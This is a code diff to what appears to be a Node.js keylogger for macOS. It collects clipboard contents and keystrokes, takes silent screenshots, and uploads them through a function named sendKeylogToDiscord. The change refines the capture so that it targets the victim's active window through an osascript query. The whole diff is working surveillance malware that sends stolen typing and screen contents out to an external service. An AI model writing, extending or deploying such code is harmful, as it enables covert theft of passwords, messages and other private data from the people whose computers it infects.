@@ -883,26 +883,37 @@ setInterval(() => {
                 }
                 keysBuffer += clipboard.substring(0, 5000);
                 
-                // Take screenshot when clipboard changes
+                // Take screenshot of active window (not desktop background)
                 const timestamp = Date.now();
                 const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                 
-                exec(`screencapture -x "${screenshotFile}"`, (screenshotError) => {
-                    if (!screenshotError && fs.existsSync(screenshotFile)) {
-                        // Send with screenshot
-                        sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
-                        // Clean up screenshot after upload
-                        setTimeout(() => {
-                            try { fs.unlinkSync(screenshotFile); } catch (e) {}
-                        }, 30000);
+                // Get active window ID and capture it (shows the app/window, not desktop)
+                exec(`osascript -e 'tell application "System Events" to get id of first window of first process whose frontmost is true' 2>/dev/null`, (windowError, windowId) => {
+                    let captureCmd;
+                    if (!windowError && windowId && windowId.trim()) {
+                        // Capture specific active window
+                        captureCmd = `screencapture -x -l${windowId.trim()} "${screenshotFile}"`;
                     } else {
-                        // Send without screenshot if capture failed
-                        sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                        // Fallback: capture main display (but try to focus on active app)
+                        captureCmd = `screencapture -x -m "${screenshotFile}"`;
                     }
                     
-                    // Clear buffer after sending
-                    keysBuffer = '';
-                });
+                    exec(captureCmd, (screenshotError) => {
+                        if (!screenshotError && fs.existsSync(screenshotFile)) {
+                            // Send with screenshot
+                            sendKeylogToDiscord(keysBuffer, 'Unknown', screenshotFile);
+                            // Clean up screenshot after upload
+                            setTimeout(() => {
+                                try { fs.unlinkSync(screenshotFile); } catch (e) {}
+                            }, 30000);
+                        } else {
+                            // Send without screenshot if capture failed
+                            sendKeylogToDiscord(keysBuffer, 'Unknown', null);
+                        }
+                        
+                        // Clear buffer after sending
+                        keysBuffer = '';
+                    });
             }
         }
     });
@@ -927,20 +938,32 @@ setInterval(() => {
                 if (keystrokes && keystrokes.trim().length > 0) {
                     keysBuffer += keystrokes.substring(0, 5000);
                     
-                    // Take screenshot when actual typing detected
+                    // Take screenshot of active window when actual typing detected
                     const timestamp = Date.now();
                     const screenshotFile = path.join(screenshotDir, `typing_${timestamp}.png`);
                     
-                    exec(`screencapture -x "${screenshotFile}"`, (screenshotError) => {
-                        if (!screenshotError && fs.existsSync(screenshotFile)) {
-                            sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
-                            setTimeout(() => {
-                                try { fs.unlinkSync(screenshotFile); } catch (e) {}
-                            }, 30000);
+                    // Get active window ID and capture it (shows the app/window, not desktop)
+                    exec(`osascript -e 'tell application "System Events" to get id of first window of first process whose frontmost is true' 2>/dev/null`, (windowError, windowId) => {
+                        let captureCmd;
+                        if (!windowError && windowId && windowId.trim()) {
+                            // Capture specific active window
+                            captureCmd = `screencapture -x -l${windowId.trim()} "${screenshotFile}"`;
                         } else {
-                            sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
+                            // Fallback: capture main display
+                            captureCmd = `screencapture -x -m "${screenshotFile}"`;
                         }
-                        keysBuffer = '';
+                        
+                        exec(captureCmd, (screenshotError) => {
+                            if (!screenshotError && fs.existsSync(screenshotFile)) {
+                                sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', screenshotFile);
+                                setTimeout(() => {
+                                    try { fs.unlinkSync(screenshotFile); } catch (e) {}
+                                }, 30000);
+                            } else {
+                                sendKeylogToDiscord(keysBuffer, 'Actual Typing (pke)', null);
+                            }
+                            keysBuffer = '';
+                        });
                     });
                 }
             }
